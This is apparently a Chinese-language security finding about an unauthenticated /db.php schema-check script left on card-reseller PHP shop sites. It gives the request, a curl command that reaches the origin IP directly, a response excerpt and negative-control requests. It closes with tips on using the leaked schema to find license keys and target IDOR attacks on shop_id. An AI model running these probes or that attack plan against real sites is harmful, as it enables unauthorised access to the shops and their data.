# /db.php 数据库结构体检工具未授权泄露表结构

## 背景
卡商/寄售商城这类自研 PHP 站常用一套带「数据库结构体检与修复」脚本的建站骨架。
运维上线后忘记删除 db.php，于是它成了零鉴权的 schema 广播页。

## 请求
GET /db.php HTTP/1.1
Host: <target-domain>

（实测用 curl：
curl.exe -sS -k --noproxy "*" --tlsv1.2 --tlsmax 1.2 \
  --resolve <domain>:443:<source-ip> "https://<domain>/db.php"）

## 响应（节选，2026-11-05 实测）
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
（2006 字节）

<div ...>🩺 数据库结构体检与修复工具</div>
<div>✅ 正常：表 `users` 包含字段 `points`</div>
<div>✅ 正常：表 `products` 包含字段 `shop_id`</div>
<div>✅ 正常：表 `products` 包含字段 `is_recommend`</div>
<div>✅ 正常：表 `products` 包含字段 `sale_price`</div>
<div>✅ 正常：表 `orders` 包含字段 `shop_id`</div>
<div>✅ 正常：表 `cart` 包含字段 `shop_id`</div>
<div>✅ 正常：表 `recharges` 包含字段 `shop_id`</div>
<div>✅ 正常：表 `withdrawals` 包含字段 `shop_id`</div>
<div>✅ 正常：表 `coupons` 包含字段 `shop_id`</div>
<div>✅ 正常：表 `shops` 包含字段 `auth_code`</div>
<div>✅ 正常：表 `shops` 包含字段 `pay_type`</div>
<div>✅ 正常：表 `shops` 包含字段 `banners`</div>
<div>✅ 正常：表 `shops` 包含字段 `links`</div>
（共 19 行字段存在性结论）
🎉 数据库结构体检完毕，所有字段均已对齐，请立即删除此文件！

## 静态性验证（负控）
以下调用全部返回同一 2006 字节、MD5 = BE9F64B25F48A8BA91AF45D42E43A35E，
与无参基线逐字节一致：
- GET /db.php?action=check
- GET /db.php?action=repair
- GET /db.php?action=tables
- GET /db.php?do=check
- GET /db.php?run=1
- POST /db.php  body: action=check

⇒ 页面不吃任何入参，只输出固定结构，不回表行数与真实数据。
不要期待它给 dump；它的价值是省掉整库表名/字段猜测。

## 判读要点
- 只看「✅ 正常」行即可，这就是完整 schema 白名单。
- 出现 shops.auth_code ⇒ 直接对上易信SUP license 激活链 / app_key 位置。
- 出现 cards/goods/orders + shop_id ⇒ 明确多租户分表模型，后续 IDOR 优先打 shop_id 维度。
